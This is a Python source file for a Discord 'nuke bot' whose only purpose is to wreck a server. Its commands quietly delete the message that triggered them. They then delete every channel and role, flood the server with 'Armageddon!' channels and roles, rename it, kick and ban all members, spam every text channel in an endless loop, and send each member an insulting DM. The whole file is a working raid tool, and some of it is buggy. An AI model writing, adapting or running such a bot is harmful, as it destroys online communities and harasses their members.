import os
from colorama import Fore
import discord
from discord.ext import commands
from asyncio import sleep
from datetime import datetime


class CONFIG:
        TOKEN = '' #str
        PREFIX = '' #str


client = commands.Bot(command_prefix = CONFIG.PREFIX , help_command = None ,intents = discord.Intents.all())


@client.event
async def on_ready():
        if os.name == 'nt':
                os.system('cls')
        else:
                os.system('clear')

        print(Fore.RED + """
 ███▄    █  █    ██  ██ ▄█▀▓█████     ▄▄▄▄    ▒█████  ▄▄▄█████▓
 ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀    ▓█████▄ ▒██▒  ██▒▓  ██▒ ▓▒
▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███      ▒██▒ ▄██▒██░  ██▒▒ ▓██░ ▒░
▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄    ▒██░█▀  ▒██   ██░░ ▓██▓ ░ 
▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒   ░▓█  ▀█▓░ ████▓▒░  ▒██▒ ░ 
░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░   ░▒▓███▀▒░ ▒░▒░▒░   ▒ ░░   
░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░   ▒░▒   ░   ░ ▒ ▒░     ░    
   ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░       ░    ░ ░ ░ ░ ▒    ░      
         ░    ░     ░  ░      ░  ░    ░          ░ ░           
                                           ░                   
----------------------------------------------------------------
        """ + Fore.RESET)
        print(datetime.today().replace(microsecond=0) ,'\n\nBot is online\nDeveloped by ErfanNJZ')


@client.event
async def on_command_error(ctx , error):
        if isinstance(error , commands.CommandNotFound):
                pass


@client.command()
async def dchannels(ctx):
        await ctx.message.delete()
        for channel in ctx.guild.channels:
                try:
                        await channel.delete()
                        print('All Channels Deleted!')
                except:
                        print('No Channels Found!')


@client.command()
async def cchannels(ctx):
        await ctx.message.delete()
        try:
                for i in range(10):
                        guild = ctx.message.guild
                        await guild.create_text_channel('Armageddon!') and await guild.create_voice_channel('Armageddon!')
                        print("Channel Created!")
        except:
                print("Error!")


@client.command()
async def dcchannels(ctx):
        await ctx.message.delete()
        try:
                for channel in ctx.guild.channels:
                        await channel.delete()
                        print('Error!')
        except:
                pass
                try:
                        for i in range(10):
                                guild = ctx.message.guild
                                await guild.create_text_channel('Armageddon!') and await guild.create_voice_channel('Armageddon!')
                                print("Channel Created!")
                except:
                        print("Error!")

@client.command()
async def sname(ctx , * , msg = None):
        await ctx.message.delete()
        if msg is not None:
                await ctx.guild.edit(name = msg)
        else:
                print('Error!')


@client.command()
async def droles(ctx):
        await ctx.message.delete()
        guild = ctx.message.guild
        for role in guild.roles:
                try:
                        await role.delete()
                        print('Roles Deleted!')
                except:
                        print('No Roles Found!')


@client.command()
async def croles(ctx , amount):
        await ctx.message.delete()
        guild = ctx.message.guild
        for role in range (int(amount)):
                try:
                        await guild.create_role(name = 'Armaggedon!')
                        print('Role Created!')
                except:
                        print('Error!')


@client.command()
async def akick(ctx):
    await ctx.message.delete()
    guild = ctx.guild.members
    for member in guild:
        try:
                await member.kick()
                print('Members Kicked!')
        except:
                print('No Members Found!')


@client.command()
async def aban(ctx):
        await ctx.message.delete()
        guild = ctx.guild.members
        for member in guild:
                try:
                        await member.ban()
                        print('Members Banned!')
                except:
                        print('No Members Found!')
        

@client.command()
async def spam(ctx):
        await ctx.message.delete()
        guild = ctx.message.member
        print('Spamming Enabled!')
        while True:
                for channel in guild.text_channels:
                        await channel.send('Armageddon!')


@client.command()
async def dmall(ctx):
        await ctx.message.delete()
        guild = ctx.message.guild
        for member in guild.members:
                await sleep(0)
                try:
                        await member.send('Server Fucked Up Successfully!')
                        await ctx.send('Message Sent!')
                except:
                        print('No Members Found!')


client.run(CONFIG.TOKEN)